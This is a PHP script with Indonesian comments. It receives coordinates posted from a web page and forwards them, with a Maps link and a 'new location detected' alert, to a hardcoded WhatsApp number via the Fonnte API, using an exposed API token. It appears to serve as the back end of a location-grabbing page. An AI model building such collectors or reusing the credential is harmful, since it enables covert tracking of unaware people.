<?php
// Ambil data lokasi yang dikirim dari index.html
$lat = $_POST['lat'] ?? '';
$lon = $_POST['lon'] ?? '';

if ($lat && $lon) {
    // 1. PENGATURAN API FONNTE
    $token = "FppCnGYZuSjJzmp9LCq8"; 
    $nomor_hp_kamu = "6283166311396"; 
    
    // 2. PESAN YANG AKAN DIKIRIM
    $pesan = "⚠️ *LOKASI BARU TERDETEKSI* ⚠️\n\n" .
             "Latitude: " . $lat . "\n" .
             "Longitude: " . $lon . "\n\n" .
             "Klik untuk lihat di Google Maps:\n" .
             "https://www.google.com/maps?q=" . $lat . "," . $lon;

    // 3. PROSES KIRIM KE WHATSAPP VIA FONNTE
    $curl = curl_init();
    curl_setopt_array($curl, array(
      CURLOPT_URL => 'https://api.fonnte.com/send',
      CURLOPT_RETURNTRANSFER => true,
      CURLOPT_POST => true,
      CURLOPT_POSTFIELDS => array(
        'target' => $nomor_hp_kamu,
        'message' => $pesan,
      ),
      CURLOPT_HTTPHEADER => array(
        "Authorization: $token"
      ),
    ));

    $response = curl_exec($curl);
    curl_close($curl);
    
    echo "Lokasi berhasil diproses dan dikirim ke WA.";
} else {
    echo "Gagal: Koordinat tidak ditemukan.";
}
?>
